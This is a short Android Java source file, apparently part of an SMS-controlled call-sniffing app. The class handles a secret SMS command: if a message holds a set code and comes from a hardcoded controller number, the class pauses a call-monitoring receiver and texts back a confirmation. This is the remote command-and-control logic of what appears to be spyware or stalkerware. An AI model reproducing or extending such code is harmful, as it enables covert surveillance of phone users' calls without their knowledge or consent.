package sms.sniff.behaviors;

import sms.sniff.call.IncomingOutgoingCall;
import sms.sniff.core.Constants;
import sms.sniff.utils.SMS;
import android.content.Context;
import android.telephony.SmsMessage;

public class PauseCallSniffer implements Behavior{
	
	private Context context;

	public PauseCallSniffer(Context context) {
		this.context = context;
	}

	@Override
	public void process(SmsMessage sms) {
		IncomingOutgoingCall incomingOutgoingCall = new IncomingOutgoingCall();
		context.unregisterReceiver(incomingOutgoingCall);
		
		new SMS(".").sendConfirmation();
	}

	@Override
	public boolean canProcess(SmsMessage sms) {
		String messageBody = sms.getMessageBody();
		String originPhoneNumber = sms.getDisplayOriginatingAddress();
		
		return messageBody.contains(Constants.messageCode_pause_callSniffer) && Constants.destination.equals(originPhoneNumber);
	}

}
